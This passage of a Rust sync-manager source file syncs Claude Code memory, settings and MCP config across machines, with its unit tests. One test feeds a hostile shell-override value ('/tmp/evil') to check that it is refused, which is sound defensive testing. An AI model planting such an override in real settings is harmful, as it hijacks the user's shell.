    if path.is_empty() || path.starts_with('/') || path.contains(':') {
        return String::new();
    }
    if path
        .split('/')
        .any(|seg| seg.is_empty() || seg == "." || seg == "..")
    {
        return String::new();
    }
    path
}

/// Build a v2 memory payload for the given project dir (under
/// `~/.claude/projects/<slug>/`). Returns `None` if no relevant files exist.
fn build_memory_payload(project_dir: &Path) -> Option<Value> {
    let memory_dir = project_dir.join("memory");
    let mut files: BTreeMap<String, Value> = BTreeMap::new();
    if memory_dir.exists() {
        let mut stack: Vec<PathBuf> = vec![memory_dir.clone()];
        while let Some(current) = stack.pop() {
            let Ok(entries) = std::fs::read_dir(&current) else {
                continue;
            };
            for entry in entries.flatten() {
                let name = entry.file_name();
                let name_str = name.to_string_lossy();
                if SKIP_DIR_NAMES.contains(&name_str.as_ref()) {
                    continue;
                }
                let path = entry.path();
                let Ok(ft) = entry.file_type() else { continue };
                if ft.is_dir() {
                    stack.push(path);
                    continue;
                }
                if !ft.is_file() {
                    continue;
                }
                let ext = path
                    .extension()
                    .and_then(|s| s.to_str())
                    .map(|s| s.to_ascii_lowercase())
                    .unwrap_or_default();
                if !MEMORY_EXTENSIONS.iter().any(|e| *e == ext) {
                    continue;
                }
                let Ok(meta) = entry.metadata() else { continue };
                if meta.len() > MEMORY_MAX_FILE_BYTES {
                    continue;
                }
                let Ok(bytes) = std::fs::read(&path) else {
                    continue;
                };
                let rel = match path.strip_prefix(&memory_dir) {
                    Ok(r) => r.to_string_lossy().replace('\\', "/"),
                    Err(_) => continue,
                };
                let mtime = meta
                    .modified()
                    .ok()
                    .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
                    .map(|d| d.as_millis() as i64)
                    .unwrap_or(0);
                files.insert(rel, json!({ "content": B64.encode(bytes), "mtime": mtime }));
            }
        }
    }

    let memory_md_path = project_dir.join("MEMORY.md");
    let memory_md_entry = if memory_md_path.exists() {
        match std::fs::metadata(&memory_md_path) {
            Ok(meta) if meta.len() <= MEMORY_MAX_FILE_BYTES => {
                std::fs::read(&memory_md_path).ok().map(|bytes| {
                    let mtime = meta
                        .modified()
                        .ok()
                        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
                        .map(|d| d.as_millis() as i64)
                        .unwrap_or(0);
                    json!({ "content": B64.encode(bytes), "mtime": mtime })
                })
            }
            _ => None,
        }
    } else {
        None
    };

    if files.is_empty() && memory_md_entry.is_none() {
        return None;
    }
    let mut out = serde_json::Map::new();
    let files_obj: serde_json::Map<String, Value> = files.into_iter().collect();
    out.insert("files".to_string(), Value::Object(files_obj));
    out.insert(
        "memoryMd".to_string(),
        memory_md_entry.unwrap_or(Value::Null),
    );
    Some(Value::Object(out))
}

/// The bytes and `mtime` (ms) of one memory payload entry: `{content,
/// mtime}`, or a bare base64 string from an older writer (mtime 0).
fn memory_entry(entry: &Value) -> Option<(Vec<u8>, i64)> {
    let (b64, mtime) = match entry {
        Value::String(s) => (s.as_str(), 0),
        Value::Object(obj) => (
            obj.get("content")?.as_str()?,
            obj.get("mtime").and_then(Value::as_i64).unwrap_or(0),
        ),
        _ => return None,
    };
    Some((B64.decode(b64).ok()?, mtime))
}

/// Record a memory path the watcher reported: gone -> a tombstone for
/// the file, or for every file this key last held under it when it was
/// a directory; there again -> revived (for a directory, every memory
/// file in it). `name` is the path's memory name in project dir `slug`,
/// whose memory syncs under `key`.
fn note_memory_change(
    st: &mut PushState,
    claude_projects_dir: &Path,
    path: &Path,
    slug: &str,
    name: String,
    key: String,
) {
    match std::fs::metadata(path) {
        Ok(meta) => {
            let names: Vec<String> = if meta.is_dir() {
                let project_dir = claude_projects_dir.join(slug);
                memory_files_under(&project_dir, path)
            } else if is_memory_file_name(&name) {
                vec![name]
            } else {
                Vec::new()
            };
            for name in names {
                if let Some(tombs) = st.pending_memory_tombstones.get_mut(&key) {
                    tombs.remove(&name);
                }
                st.pending_memory_revivals
                    .entry(key.clone())
                    .or_default()
                    .insert(name);
            }
        }
        Err(_) => {
            let names: Vec<String> = if is_memory_file_name(&name) {
                vec![name]
            } else {
                // A directory (memory/ itself, or a subdir): what it held.
                let prefix = format!("{name}/");
                st.memory_names
                    .get(&key)
                    .map(|known| {
                        known
                            .iter()
                            .filter(|n| n.starts_with(&prefix))
                            .cloned()
                            .collect()
                    })
                    .unwrap_or_default()
            };
            let now = now_ms();
            for name in names {
                if let Some(revived) = st.pending_memory_revivals.get_mut(&key) {
                    revived.remove(&name);
                }
                st.pending_memory_tombstones
                    .entry(key.clone())
                    .or_default()
                    .insert(name, now);
            }
        }
    }
}

/// Now, in ms since the epoch.
fn now_ms() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

/// For a path under `~/.claude/projects`, the project dir name and the
/// memory name it has there: `MEMORY.md`, `memory` (the dir itself) or
/// `memory/<rel>` with forward slashes. `None` for anything else.
fn memory_name_of(claude_projects_dir: &Path, path: &Path) -> Option<(String, String)> {
    let rel = path.strip_prefix(claude_projects_dir).ok()?;
    let mut parts = rel
        .components()
        .map(|c| c.as_os_str().to_string_lossy().into_owned());
    let slug = parts.next()?;
    let rest: Vec<String> = parts.collect();
    let name = match rest.first().map(String::as_str) {
        Some("MEMORY.md") if rest.len() == 1 => MEMORY_MD_NAME.to_string(),
        Some("memory") => rest.join("/"),
        _ => return None,
    };
    Some((slug, name))
}

/// Whether a memory name is one the memory key syncs as a file: `MEMORY.md`,
/// or `memory/<rel>` with a memory extension and no dot-prefixed segment.
fn is_memory_file_name(name: &str) -> bool {
    if name == MEMORY_MD_NAME {
        return true;
    }
    let Some(rel) = name.strip_prefix("memory/") else {
        return false;
    };
    let ext = Path::new(rel)
        .extension()
        .and_then(|e| e.to_str())
        .map(str::to_ascii_lowercase);
    ext.is_some_and(|ext| MEMORY_EXTENSIONS.contains(&ext.as_str()))
        && !rel
            .split('/')
            .any(|seg| seg.is_empty() || seg.starts_with('.'))
}

/// The memory names of the files under `dir` (inside `project_dir`).
fn memory_files_under(project_dir: &Path, dir: &Path) -> Vec<String> {
    let mut out = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(current) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&current) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if entry.file_type().is_ok_and(|t| t.is_dir()) {
                stack.push(path);
                continue;
            }
            let Ok(rel) = path.strip_prefix(project_dir) else {
                continue;
            };
            let name = rel.to_string_lossy().replace('\\', "/");
            if is_memory_file_name(&name) {
                out.push(name);
            }
        }
    }
    out
}

/// The memory names (`memory/<rel>`, `MEMORY.md`) a memory value holds.
fn memory_names_in(value: &Value) -> BTreeSet<String> {
    let mut names: BTreeSet<String> = value
        .get("files")
        .and_then(Value::as_object)
        .map(|files| files.keys().map(|rel| memory_tombstone_name(rel)).collect())
        .unwrap_or_default();
    if value.get("memoryMd").is_some_and(|md| !md.is_null()) {
        names.insert(MEMORY_MD_NAME.to_string());
    }
    names
}

/// A file's modification time in ms since the epoch, `None` when it does
/// not exist (or has no readable time).
async fn mtime_ms(path: &Path) -> Option<i64> {
    let meta = tokio::fs::metadata(path).await.ok()?;
    let since = meta.modified().ok()?.duration_since(UNIX_EPOCH).ok()?;
    Some(since.as_millis() as i64)
}

/// Write one pulled memory file, unless the local copy is newer than the
/// payload's (it was edited after, and the push that follows sends it).
async fn write_memory_file(
    target: &Path,
    bytes: &[u8],
    mtime: i64,
    backups: &Backups,
) -> Result<(), IdeError> {
    if mtime_ms(target).await.is_some_and(|local| local > mtime) {
        return Ok(());
    }
    if replace_file(target, bytes, backups).await? {
        // The payload's time, not the time of this write: otherwise the
        // next push offers the file as newer than the server's copy, and
        // the other machine rewrites it in turn.
        set_mtime_ms(target, mtime).await;
    }
    Ok(())
}

/// Set a file's modification time to `ms` since the epoch (not for `ms <=
/// 0`, an entry from a writer that sent none). Best-effort.
async fn set_mtime_ms(path: &Path, ms: i64) {
    let Ok(ms) = u64::try_from(ms) else { return };
    if ms == 0 {
        return;
    }
    let path = path.to_path_buf();
    let when = UNIX_EPOCH + Duration::from_millis(ms);
    let set = tokio::task::spawn_blocking(move || {
        // Windows refuses to set times through a read-only handle.
        std::fs::OpenOptions::new()
            .write(true)
            .open(&path)?
            .set_modified(when)
    })
    .await;
    if let Ok(Err(e)) = set {
        tracing::debug!(target: "mnemos_ide_sync::manager", "memory file mtime not set: {e}");
    }
}

/// Write a pulled memory payload under `project_dir`: each file (and
/// `MEMORY.md`) that is not newer here, backing up what it replaces. A
/// timed tombstone (`__deleted_at`) moves the local file to the backups
/// when it is no newer than the delete; a name only in an older writer's
/// `__deleted_files` is never acted on.
async fn apply_memory_payload(
    project_dir: &Path,
    value: &Value,
    backups: &Backups,
) -> Result<(), IdeError> {
    let memory_dir = project_dir.join("memory");
    let tombstones: BTreeMap<String, i64> = value
        .get("__deleted_at")
        .and_then(Value::as_object)
        .map(|t| {
            t.iter()
                .filter_map(|(name, at)| Some((name.clone(), at.as_i64()?)))
                .collect()
        })
        .unwrap_or_default();
    // An older build's union can carry a file and its own tombstone.
    let deleted = |name: &str, mtime: i64| tombstones.get(name).is_some_and(|at| *at >= mtime);
    let mut failed = 0usize;
    if let Some(files) = value.get("files").and_then(Value::as_object) {
        for (rel, entry) in files {
            let normalized = normalize_relative(rel);
            if normalized.is_empty() {
                continue;
            }
            let Some((bytes, mtime)) = memory_entry(entry) else {
                continue;
            };
            if deleted(&memory_tombstone_name(&normalized), mtime) {
                continue;
            }
            if let Err(e) =
                write_memory_file(&memory_dir.join(&normalized), &bytes, mtime, backups).await
            {
                tracing::warn!(target: "mnemos_ide_sync::manager", rel = %normalized, "memory file not written: {e:#}");
                failed += 1;
            }
        }
    }
    if let Some((bytes, mtime)) = value.get("memoryMd").and_then(memory_entry) {
        if !deleted(MEMORY_MD_NAME, mtime) {
            if let Err(e) =
                write_memory_file(&project_dir.join("MEMORY.md"), &bytes, mtime, backups).await
            {
                tracing::warn!(target: "mnemos_ide_sync::manager", "MEMORY.md not written: {e:#}");
                failed += 1;
            }
        }
    }
    for (name, at) in &tombstones {
        // Only ever a memory file: a server name must not reach the
        // project's transcripts.
        if !is_memory_file_name(name) {
            continue;
        }
        let normalized = normalize_relative(name);
        if normalized.is_empty() {
            continue;
        }
        let target = project_dir.join(&normalized);
        match mtime_ms(&target).await {
            // Edited after the delete: the push that follows revives it.
            Some(local) if local > *at => continue,
            Some(_) => {}
            None => continue,
        }
        match backups.take(&target).await {
            Ok(dest) => tracing::info!(
                target: "mnemos_ide_sync::manager",
                name,
                backup = %dest.display(),
                "memory file deleted on the other machine; moved to the backups",
            ),
            Err(e) => {
                tracing::warn!(target: "mnemos_ide_sync::manager", name, "kept a memory file the other machine deleted: {e:#}");
                failed += 1;
            }
        }
    }
    if failed > 0 {
        return Err(IdeError::Other(format!(
            "{failed} memory file(s) under {project_dir:?} could not be applied"
        )));
    }
    Ok(())
}

/// Decode a JWT's payload claims and pull the `sub` (or `profile_id`) field.
pub(crate) fn extract_profile_id_from_jwt(token: &str) -> Option<String> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 2 {
        return None;
    }
    let payload_b64 = parts[1];
    let decoded = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(payload_b64.as_bytes())
        .or_else(|_| {
            base64::engine::general_purpose::STANDARD_NO_PAD.decode(payload_b64.as_bytes())
        })
        .ok()?;
    let value: Value = serde_json::from_slice(&decoded).ok()?;
    value
        .get("profile_id")
        .or_else(|| value.get("profileId"))
        .or_else(|| value.get("sub"))
        .and_then(Value::as_str)
        .map(|s| s.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::auth::{AdminAuth, AdminTokens};
    use chrono::{Duration, Utc};

    #[test]
    fn transient_classification_covers_offline_and_5xx_only() {
        assert!(is_transient(&IdeError::Http {
            status: reqwest::StatusCode::SERVICE_UNAVAILABLE,
            body: String::new(),
        }));
        assert!(is_transient(&IdeError::Http {
            status: reqwest::StatusCode::TOO_MANY_REQUESTS,
            body: String::new(),
        }));
        assert!(!is_transient(&IdeError::Http {
            status: reqwest::StatusCode::NOT_FOUND,
            body: String::new(),
        }));
        assert!(!is_transient(&IdeError::NotAuthenticated));
        assert!(!is_transient(&IdeError::Other("nope".into())));
    }

    #[tokio::test]
    async fn connect_failure_is_transient_and_reads_as_offline() {
        // Port 1 on loopback refuses instantly — a real reqwest connect
        // error, no network required.
        let err = reqwest::Client::new()
            .get("http://127.0.0.1:1/")
            .send()
            .await
            .expect_err("connect must fail");
        let err = IdeError::from(err);
        assert!(is_transient(&err), "{err}");
        assert!(status_error_message(&err).ends_with("will retry"));
    }

    #[test]
    fn retry_backoff_climbs_then_plateaus() {
        let mut sched = RetrySchedule::first();
        assert_eq!(sched.attempts, 1);
        for _ in 0..10 {
            sched = sched.backed_off();
        }
        assert_eq!(sched.attempts, 11);
        // Capped at the last step, never giving up entirely.
        let last = std::time::Duration::from_millis(*TRANSIENT_RETRY_BACKOFF_MS.last().unwrap());
        let wait = sched.next_at.saturating_duration_since(Instant::now());
        assert!(
            wait <= last && wait > last - std::time::Duration::from_secs(1),
            "{wait:?}"
        );
    }

    /// Every manager built here resolves its default paths under a
    /// throwaway dir: `Paths::discover` creates the Mnemos data dir, and a
    /// test must never touch the real `%APPDATA%\Mnemos`.
    fn isolate_data_dir() {
        static DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
        let dir = DIR.get_or_init(|| tempfile::tempdir().unwrap());
        let _ = mnemos_ide_core::paths::override_data_dir(dir.path().to_path_buf());
    }

    fn tokens() -> AdminTokens {
        isolate_data_dir();
        AdminTokens {
            access_token: "AT".to_string(),
            refresh_token: "RT".to_string(),
            expires_at: Utc::now() + Duration::hours(1),
        }
    }

    #[tokio::test]
    async fn lifecycle_stop_without_start_is_noop() {
        let mgr = Arc::new(SyncManager::from_auth(AdminAuth::from_tokens(
            "https://admin.example.test",
            tokens(),
        )));
        mgr.stop().await.unwrap();
    }

    #[test]
    fn cwd_from_transcripts_skips_summary_lines_and_prefers_newest() {
        let tmp = tempfile::tempdir().unwrap();
        let old = tmp.path().join("old.jsonl");
        std::fs::write(&old, "{\"type\":\"summary\"}\n{\"cwd\":\"/old/path\"}\n").unwrap();
        let new = tmp.path().join("new.jsonl");
        std::fs::write(&new, "{\"type\":\"summary\"}\n{\"cwd\":\"/new/path\"}\n").unwrap();
        let later = SystemTime::now() + std::time::Duration::from_secs(60);
        // Windows refuses to set times through a read-only handle.
        std::fs::OpenOptions::new()
            .write(true)
            .open(&new)
            .unwrap()
            .set_modified(later)
            .unwrap();
        let none = HashSet::new();
        assert_eq!(
            cwd_from_transcripts(tmp.path(), &none),
            Some(PathBuf::from("/new/path"))
        );
        assert_eq!(
            cwd_from_transcripts(&tmp.path().join("missing"), &none),
            None
        );
        // A pulled session is passed over; the next newest speaks.
        let pulled = HashSet::from(["new".to_string()]);
        assert_eq!(
            cwd_from_transcripts(tmp.path(), &pulled),
            Some(PathBuf::from("/old/path"))
        );
    }

    #[test]
    fn sha_is_stable() {
        assert_eq!(
            sha256_hex(b"hello"),
            "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824",
        );
    }

    #[cfg(unix)]
    fn mode_of(path: &Path) -> u32 {
        use std::os::unix::fs::PermissionsExt;
        std::fs::metadata(path).unwrap().permissions().mode() & 0o7777
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn atomic_write_keeps_modes_and_makes_scripts_executable() {
        use std::os::unix::fs::PermissionsExt;
        let tmp = tempfile::tempdir().unwrap();
        let chmod = |p: &Path, mode: u32| {
            std::fs::set_permissions(p, std::fs::Permissions::from_mode(mode)).unwrap()
        };

        // A secret stays private.
        let env = tmp.path().join(".env");
        std::fs::write(&env, "A=1\n").unwrap();
        chmod(&env, 0o600);
        atomic_write(&env, b"A=2\n").await.unwrap();
        assert_eq!(mode_of(&env), 0o600);
        assert_eq!(std::fs::read(&env).unwrap(), b"A=2\n");
        // One an older build left world-readable is made private again.
        chmod(&env, 0o644);
        atomic_write(&env, b"A=3\n").await.unwrap();
        assert_eq!(mode_of(&env), 0o600);

        // A hook an older build stripped gets its exec bits back.
        let hook = tmp.path().join("hook.py");
        std::fs::write(&hook, "#!/usr/bin/env python3\n").unwrap();
        chmod(&hook, 0o644);
        atomic_write(&hook, b"#!/usr/bin/env python3\nprint(1)\n")
            .await
            .unwrap();
        assert_eq!(mode_of(&hook), 0o755);

        // A private script stays private.
        let private = tmp.path().join("private.sh");
        std::fs::write(&private, "#!/bin/sh\n").unwrap();
        chmod(&private, 0o600);
        atomic_write(&private, b"#!/bin/sh\necho\n").await.unwrap();
        assert_eq!(mode_of(&private), 0o700);

        // New files: a script is 0755, a new .env 0600, anything else the
        // default a plain write gets.
        let new_script = tmp.path().join("new.sh");
        atomic_write(&new_script, b"#!/bin/sh\n").await.unwrap();
        assert_eq!(mode_of(&new_script), 0o755);
        let sub = tmp.path().join("sub");
        let new_env = sub.join(".env");
        atomic_write(&new_env, b"B=1\n").await.unwrap();
        assert_eq!(mode_of(&new_env), 0o600);
        let plain = tmp.path().join("plain.md");
        atomic_write(&plain, b"text").await.unwrap();
        let reference = tmp.path().join("reference.md");
        std::fs::write(&reference, "text").unwrap();
        assert_eq!(mode_of(&plain), mode_of(&reference));
        // No temp file left behind.
        assert!(!tmp.path().join(".plain.md.tmp").exists());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn a_start_heals_the_modes_of_files_already_in_sync() {
        use std::os::unix::fs::PermissionsExt;
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let script = "#!/usr/bin/env python3\nprint(1)\n";
        {
            let mut a = admin.lock().unwrap();
            a.states.insert("claude-env".into(), (json!("A=1\n"), 3));
            a.states
                .insert("claude-statusline".into(), (json!(script), 4));
            a.states.insert("claude-md".into(), (json!("text"), 5));
        }
        let claude = tmp.path().join("home").join(".claude");
        std::fs::create_dir_all(&claude).unwrap();
        // As an older build's pull left them.
        for (name, bytes) in [
            (".env", "A=1\n"),
            ("statusline.py", script),
            ("CLAUDE.md", "text"),
        ] {
            std::fs::write(claude.join(name), bytes).unwrap();
            std::fs::set_permissions(claude.join(name), std::fs::Permissions::from_mode(0o644))
                .unwrap();
        }
        let mgr = isolated_manager(&admin, tmp.path()).await;
        // statusline.py only syncs with the hooks opt-in.
        mgr.set_hooks_sync(true);
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        assert_eq!(mode_of(&claude.join(".env")), 0o600);
        assert_eq!(mode_of(&claude.join("statusline.py")), 0o755);
        assert_eq!(mode_of(&claude.join("CLAUDE.md")), 0o644);
        assert!(admin.lock().unwrap().puts.is_empty());
        assert!(
            !backup_root(&tmp.path().join("home")).exists(),
            "nothing was replaced"
        );
    }

    /// A manager over `admin` whose `~/.claude`, `~/.claude.json` and Mnemos
    /// store all live under `tmp` (`tmp/home`, `tmp/store`).
    async fn isolated_manager(admin: &SharedAdmin, tmp: &Path) -> Arc<SyncManager> {
        let home = tmp.join("home");
        std::fs::create_dir_all(home.join(".claude")).unwrap();
        let store = tmp.join("store");
        if !store.join("projects.json").exists() {
            write_registry(&store, vec![]);
        }
        let auth = AdminAuth {
            base_url: fake_admin(admin.clone()).await,
            tokens: Some(tokens()),
        };
        Arc::new(
            SyncManager::from_auth(auth)
                .with_mnemos_store_dir(store)
                .with_claude_home(&home),
        )
    }

    fn set_mtime(path: &Path, when: SystemTime) {
        // Windows refuses to set times through a read-only handle.
        std::fs::OpenOptions::new()
            .write(true)
            .open(path)
            .unwrap()
            .set_modified(when)
            .unwrap();
    }

    fn mtime_of(path: &Path) -> SystemTime {
        std::fs::metadata(path).unwrap().modified().unwrap()
    }

    #[tokio::test]
    async fn claude_json_is_only_written_when_its_mcp_servers_change() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let claude_json = tmp.path().join("home").join(".claude.json");
        let slot = json!({"srv": {"command": "x"}});
        let envelope = json!({ current_platform(): slot.clone() });

        // Missing: left missing (Claude Code creates and restores it), and
        // the version stays unknown so a later pull tries again.
        assert!(mgr
            .apply_state(CLAUDE_JSON_MCP_SYNC_KEY, &envelope, &push_state)
            .await
            .is_err());
        assert!(!claude_json.exists());

        // Not JSON (Claude Code mid-write, or a corrupt file): untouched.
        std::fs::write(&claude_json, "{\"numStartups\": 3,").unwrap();
        assert!(mgr
            .apply_state(CLAUDE_JSON_MCP_SYNC_KEY, &envelope, &push_state)
            .await
            .is_err());
        assert_eq!(
            std::fs::read_to_string(&claude_json).unwrap(),
            "{\"numStartups\": 3,"
        );
        std::fs::write(&claude_json, "[1, 2]").unwrap();
        assert!(mgr
            .apply_state(CLAUDE_JSON_MCP_SYNC_KEY, &envelope, &push_state)
            .await
            .is_err());
        assert_eq!(std::fs::read_to_string(&claude_json).unwrap(), "[1, 2]");

        // A real config: only mcpServers changes.
        std::fs::write(
            &claude_json,
            serde_json::to_vec(&json!({"numStartups": 3, "mcpServers": {}})).unwrap(),
        )
        .unwrap();
        mgr.apply_state(CLAUDE_JSON_MCP_SYNC_KEY, &envelope, &push_state)
            .await
            .unwrap();
        let written: Value = serde_json::from_slice(&std::fs::read(&claude_json).unwrap()).unwrap();
        assert_eq!(written, json!({"numStartups": 3, "mcpServers": slot}));

        // Already holding exactly that slot: not written again.
        let past = SystemTime::now() - std::time::Duration::from_secs(3600);
        set_mtime(&claude_json, past);
        let before = std::fs::read(&claude_json).unwrap();
        let fresh = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.apply_state(CLAUDE_JSON_MCP_SYNC_KEY, &envelope, &fresh)
            .await
            .unwrap();
        assert_eq!(mtime_of(&claude_json), past);
        assert_eq!(std::fs::read(&claude_json).unwrap(), before);
        assert!(
            !fresh.lock().await.is_suppressed(&claude_json),
            "nothing to mute"
        );

        // A slot that is not an object is refused.
        let junk = json!({ current_platform(): "oops" });
        assert!(mgr
            .apply_state(CLAUDE_JSON_MCP_SYNC_KEY, &junk, &push_state)
            .await
            .is_err());
        assert_eq!(std::fs::read(&claude_json).unwrap(), before);
    }

    fn fake_manager_with_toml(toml_path: PathBuf) -> Arc<SyncManager> {
        Arc::new(
            SyncManager::from_auth(AdminAuth::from_tokens(
                "https://admin.example.test",
                tokens(),
            ))
            .with_mnemos_settings_toml(toml_path),
        )
    }

    #[tokio::test]
    async fn classify_recognizes_mnemos_settings_toml_path() {
        let tmp = tempfile::tempdir().unwrap();
        let toml_path = tmp.path().join("settings.toml");
        let mgr = fake_manager_with_toml(toml_path.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let change = crate::watcher::ChangeEvent {
            paths: vec![toml_path],
            is_remove: false,
        };
        let scope = mgr.classify(&change, &push_state).await;
        assert_eq!(scope, Some(DebounceScope::MnemosSettingsToml));
    }

    fn toml_policy() -> SettingsPolicy {
        Arc::new(|path: &str| match path {
            "appearance.theme" => Some(crate::settings_toml::SettingsKeyScope::Global),
            "session.startup_shell_override" => Some(crate::settings_toml::SettingsKeyScope::Local),
            _ => None,
        })
    }

    #[tokio::test]
    async fn apply_state_writes_synced_settings_only_and_suppresses() {
        let tmp = tempfile::tempdir().unwrap();
        let toml_path = tmp.path().join("settings.toml");
        let mgr = Arc::new(
            SyncManager::from_auth(AdminAuth::from_tokens(
                "https://admin.example.test",
                tokens(),
            ))
            .with_mnemos_settings_toml(toml_path.clone())
            .with_settings_policy(toml_policy()),
        );
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        std::fs::write(
            &toml_path,
            "[session]\nstartup_shell_override = \"/bin/zsh\"\n",
        )
        .unwrap();

        let value = json!({
            "v": 2,
            "global": {
                "appearance.theme": "phenomenon",
                "session.startup_shell_override": "/tmp/evil"
            }
        });
        mgr.apply_state(SETTINGS_V2_KEY, &value, &push_state)
            .await
            .unwrap();
        let written = tokio::fs::read_to_string(&toml_path).await.unwrap();
        assert!(written.contains("theme = \"phenomenon\""));
        assert!(written.contains("startup_shell_override = \"/bin/zsh\""));
        assert!(!written.contains("evil"));
        // Path is suppressed so the watcher won't echo it back as a push.
        assert!(push_state.lock().await.is_suppressed(&toml_path));

        // The whole-file value of older builds is never written.
        mgr.apply_state(
            MNEMOS_USER_SETTINGS_KEY,
            &json!("[session]\nstartup_shell_override = \"/tmp/evil\"\n"),
            &push_state,
        )
        .await
        .unwrap();
        assert!(!tokio::fs::read_to_string(&toml_path)
            .await
            .unwrap()
            .contains("evil"));
    }

    #[tokio::test]
    async fn settings_toml_pushes_per_key_and_leaves_the_old_key_alone() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            MNEMOS_USER_SETTINGS_KEY.into(),
            (json!("whole file from an older build"), 7),
        );
        let toml_path = tmp.path().join("settings.toml");
        std::fs::write(
            &toml_path,
            "[appearance]\ntheme = \"night\"\n[session]\nstartup_shell_override = \"/bin/zsh\"\n",
        )
        .unwrap();
        let auth = AdminAuth {
            base_url: fake_admin(admin.clone()).await,
            tokens: Some(tokens()),
        };
        let mgr = Arc::new(
            SyncManager::from_auth(auth)
                .with_mnemos_store_dir(tmp.path().join("store"))
                .with_claude_home(&tmp.path().join("home"))
                .with_mnemos_settings_toml(toml_path)
                .with_settings_policy(toml_policy()),
        );
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.push_mnemos_settings_toml(&push_state).await.unwrap();
        let a = admin.lock().unwrap();
        let (v2, _) = &a.states[SETTINGS_V2_KEY];
        assert_eq!(v2["global"], json!({"appearance.theme": "night"}));
        assert_eq!(
            a.states[MNEMOS_USER_SETTINGS_KEY],
            (json!("whole file from an older build"), 7)
        );
    }

    fn fake_manager_with_store(store_dir: PathBuf) -> Arc<SyncManager> {
        Arc::new(
            SyncManager::from_auth(AdminAuth::from_tokens(
                "https://admin.example.test",
                tokens(),
            ))
            .with_mnemos_store_dir(store_dir),
        )
    }

    // ---- Registry fixtures ----

    /// A registry record in the shape the app writes (`lastOpenedAt` present,
    /// so a round trip through `Project` leaves it byte-for-byte alike).
    fn record(id: &str, name: &str, path: &str) -> Value {
        json!({
            "id": id,
            "name": name,
            "path": path,
            "createdAt": "2026-09-01T00:00:00Z",
            "lastOpenedAt": null
        })
    }

    /// [`record`] for a checkout on THIS machine: its `paths` slot names the
    /// current platform outright. A temp dir's shape says nothing reliable
    /// about the platform (`/var/folders/...` reads as linux on a Mac), so a
    /// test that needs the record to resolve here must not rely on it.
    fn record_here(id: &str, name: &str, path: &str) -> Value {
        let mut rec = record(id, name, path);
        rec["paths"] = json!({ current_platform(): path });
        rec
    }

    fn write_registry(store: &Path, records: Vec<Value>) {
        std::fs::create_dir_all(store).unwrap();
        std::fs::write(
            store.join("projects.json"),
            serde_json::to_vec_pretty(&json!({ "projects": records })).unwrap(),
        )
        .unwrap();
    }

    fn ids_of(value: &Value) -> Vec<String> {
        let mut ids: Vec<String> = value["projects"]
            .as_array()
            .map(|a| {
                a.iter()
                    .filter_map(|p| p["id"].as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        ids.sort();
        ids
    }

    fn disk_ids(store: &Path) -> Vec<String> {
        let bytes = std::fs::read(store.join("projects.json")).unwrap();
        ids_of(&serde_json::from_slice(&bytes).unwrap())
    }

    fn record_on_disk(store: &Path, id: &str) -> Value {
        let bytes = std::fs::read(store.join("projects.json")).unwrap();
        let value: Value = serde_json::from_slice(&bytes).unwrap();
        value["projects"]
            .as_array()
            .unwrap()
            .iter()
            .find(|p| p["id"] == id)
            .cloned()
            .unwrap()
    }

    // ---- Workspace state is local-only ----

    #[tokio::test]
    async fn workspace_state_is_never_pushed_or_applied() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        let mgr = fake_manager_with_store(store.clone());
        let ws_path = store.join("workspace_state.json");

        // Not watched, and a change to it maps to no push.
        assert!(!mgr.collect_watch_paths().iter().any(|t| t.path == ws_path));
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let change = crate::watcher::ChangeEvent {
            paths: vec![ws_path.clone()],
            is_remove: false,
        };
        assert_eq!(mgr.classify(&change, &push_state).await, None);

        // Not among the keys pushed at startup.
        let mnemos_files: Vec<DebounceScope> = initial_push_scopes()
            .into_iter()
            .filter(|s| {
                !matches!(
                    s,
                    DebounceScope::GlobalFile(_)
                        | DebounceScope::Directory(_)
                        | DebounceScope::ClaudeJsonMcp
                )
            })
            .collect();
        assert_eq!(
            mnemos_files,
            vec![
                DebounceScope::Projects,
                DebounceScope::Settings,
                DebounceScope::MnemosSettingsToml
            ]
        );

        // Another machine's tab list (an older build still pushes it) is
        // not written over this machine's.
        let theirs = json!({"openProjectIds": ["other"], "tabOrder": ["other"]});
        mgr.apply_state(MNEMOS_WORKSPACE_STATE_KEY, &theirs, &push_state)
            .await
            .unwrap();
        assert!(!ws_path.exists());
    }

    // ---- Per-project sync opt-out ----

    #[test]
    fn filter_projects_drops_disabled_ids_and_their_tombstones() {
        let value = json!({
            "projects": [
                {"id": "a", "name": "A"},
                {"id": "b", "name": "B"},
                {"id": "c", "name": "C"}
            ],
            "deletedProjects": {
                "b": {"deletedAt": "2026-09-01T00:00:00Z"},
                "d": {"deletedAt": "2026-09-01T00:00:00Z"}
            },
            "machineId": "m1"
        });
        let mut disabled = HashSet::new();
        disabled.insert("b".to_string());
        let filtered = filter_projects_for_push(value, &disabled);
        let ids: Vec<&str> = filtered["projects"]
            .as_array()
            .unwrap()
